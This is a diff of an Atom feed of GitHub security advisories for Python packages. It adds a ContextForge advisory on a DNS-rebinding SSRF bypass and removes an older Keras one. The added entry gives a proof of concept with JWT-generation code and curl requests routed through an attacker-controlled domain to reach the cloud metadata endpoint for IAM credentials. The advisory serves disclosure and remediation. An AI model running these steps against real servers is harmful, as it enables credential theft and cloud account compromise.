@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-08-14T19:40:44.267Z</updated>
+    <updated>2026-08-14T20:20:23.504Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,129 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[mcp-contextforge-gateway] ContextForge: DNS TOCTOU race condition causes SSRF protection bypass (`/admin/gateways/test`)]]></title>
+        <id>https://github.com/advisories/GHSA-9hgc-g3w5-67cm</id>
+        <link href="https://github.com/advisories/GHSA-9hgc-g3w5-67cm"/>
+        <updated>2026-08-14T19:49:14.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>/admin/gateways/test</code> endpoint validates submitted URLs by resolving the hostname at validation time and blocking private address ranges. The HTTP client independently re-resolves DNS at connection time with no IP binding between the two operations, creating a TOCTOU window exploitable via DNS rebinding. The source code explicitly acknowledges this limitation in two separate locations.</p>
+<h2 id="details">Details</h2>
+<p><code>validate_gateway_test_url()</code> in <code>mcpgateway/common/validators.py</code> (lines 1527–1710) calls <code>socket.getaddrinfo()</code> on the submitted hostname, checks whether the resolved IP falls in private, loopback, link-local, or cloud-metadata ranges (including <code>169.254.169.254</code>, <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, and <code>192.168.0.0/16</code>), and accepts the URL if the result is clean. The validated URL is then passed to the HTTP client <strong>as the original hostname string</strong>, not as the validated IP address.</p>
+<p>The HTTP client (<code>httpx</code>, via <code>ResilientHttpClient</code>) performs its own independent DNS resolution at connection time. No mechanism bridges the two resolutions:</p>
+<ul>
+<li>The validated IP address is never passed to the HTTP client.</li>
+<li>Only the original hostname is forwarded, triggering a second independent lookup.</li>
+<li>No TTL enforcement, mandatory DNS-cache reuse, or IP-level socket binding is
+implemented.</li>
+</ul>
+<p>The configuration options <code>ssrf_blocked_networks</code> (default: enabled, covers <code>169.254.169.254/32</code>, link-local ranges, etc.) and <code>ssrf_dns_fail_closed</code> (default: <code>True</code>) apply exclusively at <strong>validation time</strong>. They share the same TOCTOU gap because they operate on the validation-time resolution result, not on the connection-time resolution performed by the HTTP client.</p>
+<h3 id="two-independent-acknowledgements-in-the-source-code">Two independent acknowledgements in the source code</h3>
+<p><strong>Location 1</strong> — <code>mcpgateway/common/validators.py</code>, lines 1537–1543 (function docstring of <code>validate_gateway_test_url</code>):</p>
+<blockquote>
+<p>"DNS TOCTOU Limitation: This validation resolves DNS at validation time, but
+the HTTP client will re-resolve DNS at connection time. An attacker controlling
+DNS can return a public IP during validation and a private IP during connection
+(DNS rebinding). True mitigation requires pinning the validated IP into the
+connection (custom resolver/transport, or IP allowlist check at connect
+callback). This is tracked as a known limitation for future improvement."</p>
+</blockquote>
+<p><strong>Location 2</strong> — <code>mcpgateway/admin.py</code>, lines 14025–14029 (call site comment):</p>
+<blockquote>
+<p>"TODO(ICACF-15): DNS rebinding risk — allowlist and SSRF checks resolve DNS,
+but the actual ResilientHttpClient request resolves DNS a third time. An
+attacker-controlled DNS server could return a public IP during validation and a
+private IP during the actual request. Consider pinning the resolved IP for
+outbound requests (custom transport) or caching DNS resolution across
+validation and request phases."</p>
+</blockquote>
+<p>The existence of a named TODO ticket (ICACF-15) confirms the maintainers consider this an open, tracked defect.</p>
+<h3 id="prerequisites">Prerequisites</h3>
+<ol>
+<li><code>MCPGATEWAY_ADMIN_API_ENABLED=true</code> (not the default; must be explicitly
+enabled by an operator).</li>
+<li>The attacker holds a credential with explicit <code>gateways.read</code> permission
+assigned via a database role.</li>
+</ol>
+<p>Regarding prerequisite 2: the endpoint is decorated with @require_permission("gateways.read", allow_admin_bypass=False). The allow_admin_bypass=False flag explicitly disables the platform-admin shortcut, meaning even a platform admin must hold an explicit database-backed role assignment that carries gateways.read. A credential produced solely via the platform-admin bootstrap bypass described in the companion advisory (GHSA-m8rv-5m6m-32ff) — a virtual identity with no database record — is rejected with HTTP 403 at this endpoint because no role lookup can succeed without a database row. An attacker who has forged a JWT via that bootstrap path does not automatically gain access to this endpoint; they still require a separately provisioned account with an appropriate role.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<h3 id="setup">Setup</h3>
+<pre><code class="language-bash">cd /opt/mcp-cf-test
+MCPGATEWAY_ADMIN_API_ENABLED=true \
+JWT_SECRET_KEY=my-test-key-but-now-longer-than-32-bytes \
+uvicorn mcpgateway.main:app --host 0.0.0.0 --port 8000 &amp;
+sleep 5
+</code></pre>
+<h3 id="step-1--obtain-a-token-for-an-account-with-database-role-assignment">Step 1 — Obtain a token for an account with database role assignment</h3>
+<p>The exploit requires a credential for a user who exists in the database with a role carrying <code>gateways.read</code> (e.g., <code>platform_admin</code>, which holds the <code>*</code> wildcard). Register a user through the Admin UI or API and assign the <code>platform_admin</code> role, then generate a JWT:</p>
+<pre><code class="language-python">import datetime, jwt, uuid
+
+SECRET = "my-test-key-but-now-longer-than-32-bytes"
+EMAIL  = "admin@example.com"   # must have platform_admin role in DB
+now    = datetime.datetime.now(datetime.timezone.utc)
+
+payload = {
+    "sub": EMAIL,
+    "aud": "mcpgateway-api",
+    "iss": "mcpgateway",
+    "jti": str(uuid.uuid4()),
+    "iat": now,
+    "exp": now + datetime.timedelta(hours=1),
+}
+print(jwt.encode(payload, SECRET, algorithm="HS256"), end="")
+</code></pre>
+<pre><code class="language-bash">TOKEN=$(python3 /tmp/gen_token.py)
+</code></pre>
+<h3 id="step-2--baseline-control-direct-private-ip-is-rejected">Step 2 — Baseline control: direct private IP is rejected</h3>
+<p>Submitting a literal private IP is blocked unconditionally before any DNS resolution occurs:</p>
+<pre><code class="language-bash">curl -s -w "\nHTTP %{http_code}\n" \
+  -X POST http://127.0.0.1:8000/admin/gateways/test \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://169.254.169.254/latest/meta-data/", "method": "GET"}'
+# Expected: HTTP 400 — "Invalid gateway URL"
+</code></pre>
+<h3 id="step-3--dns-rebinding-attack">Step 3 — DNS rebinding attack</h3>
+<ol>
+<li>Attacker controls DNS for <code>attacker.example.com</code> with TTL set to 1 second.</li>
+<li>Initial record: <code>attacker.example.com → 1.2.3.4</code> (any public IP).</li>
+<li>Submit the request:</li>
+</ol>
+<pre><code class="language-bash">curl -s -w "\nHTTP %{http_code}\n" \
+  -X POST http://127.0.0.1:8000/admin/gateways/test \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://attacker.example.com/latest/meta-data/", "method": "GET"}'
+</code></pre>
+<ol start="4">
+<li><code>validate_gateway_test_url()</code> resolves <code>attacker.example.com → 1.2.3.4</code>;
+all SSRF checks pass.</li>
+<li>Attacker immediately flips the DNS record:
+<code>attacker.example.com → 169.254.169.254</code>.</li>
+<li><code>httpx</code> independently re-resolves the hostname and connects to
+<code>169.254.169.254</code>.</li>
+<li>The gateway returns the IMDS response body to the caller.</li>
+</ol>
+<p>Standard DNS rebinding infrastructure (e.g., <code>rbndr.us</code>) reliably achieves this window against the 1-second TTL. In cloud environments with IMDSv2 disabled or not enforced, the response contains IAM role credentials.</p>
+<h2 id="impact">Impact</h2>
+<p>Server-Side Request Forgery against internal services and cloud instance metadata. An attacker with a sufficiently privileged credential can probe internal network services, retrieve cloud credentials from <code>169.254.169.254/latest/meta-data/iam/security credentials/</code>, access internal APIs not exposed to the internet, or conduct port scanning of the internal network. In cloud environments where IMDSv1 is accessible, this can lead to full cloud account compromise through metadata-service credential theft.</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>After DNS validation passes, pin the connection to the validated IP address rather than re-passing the hostname to the HTTP client. Implement this via a custom <code>httpx</code> transport or resolver that binds the socket to the already-resolved address and sets the <code>Host</code> header to the original hostname. Additionally, enforce a maximum DNS resolution age and refuse to connect if the elapsed time between validation and connection exceeds a configurable threshold. The codebase already tracks this requirement under TODO ICACF-15; the suggested fix closes it.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/IBM/mcp-context-forge/security/advisories/GHSA-9hgc-g3w5-67cm">https://github.com/IBM/mcp-context-forge/security/advisories/GHSA-9hgc-g3w5-67cm</a></li>
+<li><a href="https://github.com/IBM/mcp-context-forge/releases/tag/v1.0.3">https://github.com/IBM/mcp-context-forge/releases/tag/v1.0.3</a></li>
+<li><a href="https://github.com/advisories/GHSA-9hgc-g3w5-67cm">https://github.com/advisories/GHSA-9hgc-g3w5-67cm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9hgc-g3w5-67cm</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-08-14T19:49:14.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[nltk] nltk: Arbitrary File Read via Path Traversal in nltk.data.load() through Percent-Encoded Sequences]]></title>
         <id>https://github.com/advisories/GHSA-m42h-3232-vpv3</id>
@@ -1301,32 +1424,5 @@ def _check_private_networks(self, ip_addr, hostname):
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-07-30T14:47:41.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[keras] Keras: HDF5 links can disclose local file contents]]></title>
-        <id>https://github.com/advisories/GHSA-m8wh-29wm-52mv</id>
-        <link href="https://github.com/advisories/GHSA-m8wh-29wm-52mv"/>
-        <updated>2026-08-07T20:35:49.000Z</updated>
-        <content type="html"><![CDATA[<p>A vulnerability in keras-team/keras versions &lt;= 3.14.0 allows arbitrary local HDF5 file content disclosure due to improper handling of HDF5 ExternalLinks. The <code>KerasFileEditor</code> and <code>keras.saving.load_weights</code> functions bypass the <code>safe_get_h5_group</code> and <code>safe_get_h5_dataset</code> helpers, which are designed to reject ExternalLinks and SoftLinks. This results in automatic dereferencing of links to external HDF5 files, enabling attackers to disclose sensitive data from the victim's local filesystem. Specifically, <code>KerasFileEditor</code> extracts attributes and datasets from linked files into its internal structures, while <code>keras.saving.load_weights</code> loads weights from linked files into the user's model. This issue can be exploited by providing a malicious <code>.h5</code>, <code>.weights.h5</code>, or <code>.keras</code> file containing ExternalLinks.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-9335">https://nvd.nist.gov/vuln/detail/CVE-2026-9335</a></li>
-<li><a href="https://github.com/keras-team/keras/commit/23370f16b0ab9a200f7550a34e54a3ceab74ba0e">https://github.com/keras-team/keras/commit/23370f16b0ab9a200f7550a34e54a3ceab74ba0e</a></li>
-<li><a href="https://huntr.com/bounties/876a7226-5428-4a66-9d05-232461120db5">https://huntr.com/bounties/876a7226-5428-4a66-9d05-232461120db5</a></li>
-<li><a href="https://github.com/keras-team/keras/pull/22899">https://github.com/keras-team/keras/pull/22899</a></li>
-<li><a href="https://github.com/keras-team/keras/pull/23165">https://github.com/keras-team/keras/pull/23165</a></li>
-<li><a href="https://github.com/keras-team/keras/commit/d338a45204bdc787c8b3c4a9b82c1911cd52dedf">https://github.com/keras-team/keras/commit/d338a45204bdc787c8b3c4a9b82c1911cd52dedf</a></li>
-<li><a href="https://github.com/keras-team/keras/releases/tag/v3.12.3">https://github.com/keras-team/keras/releases/tag/v3.12.3</a></li>
-<li><a href="https://github.com/keras-team/keras/releases/tag/v3.15.0">https://github.com/keras-team/keras/releases/tag/v3.15.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-m8wh-29wm-52mv">https://github.com/advisories/GHSA-m8wh-29wm-52mv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-m8wh-29wm-52mv</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-02T06:30:20.000Z</published>
     </entry>
 </feed>
